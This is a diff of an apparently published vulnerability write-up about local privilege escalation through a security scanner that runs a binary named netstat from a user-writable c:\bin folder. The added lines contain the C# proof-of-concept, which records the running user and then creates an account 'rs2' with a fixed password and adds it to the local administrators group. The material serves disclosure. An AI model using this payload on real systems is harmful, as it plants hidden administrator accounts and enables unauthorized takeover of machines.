@@ -64,7 +64,29 @@ By default, Windows allows any user to create new folders in the c:\ root, so I 
 
 <p>I compiled the following POC and dropped it in the c:\bin folder as netstat (no extension).
 
-<p><img src="lpenessus-poc.png" alt="screenshot3" /></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"> 
+namespace Netstat
+{
+    internal class Program
+    {
+        static void Main(string[] args)
+        {
+            using (StreamWriter writetext = new StreamWriter("c:\\users\\public\\info.txt"))
+            {
+                writetext.WriteLine("[+] Running as {0}", Environment.UserName);
+            }
+            var psi = new ProcessStartInfo("net");
+            psi.Arguments = "user rs2 Password123! /add";
+            psi.UseShellExecute = true;
+            Process.Start(psi);
+            psi = new ProcessStartInfo("net");
+            psi.Arguments = "localgroup administrators rs2 /add";
+            psi.UseShellExecute = true;
+            Process.Start(psi);
+        }
+    }
+}
+ </code></pre></div>
  
 <p>The next time a scan was launched, the following file was created: </p>
 
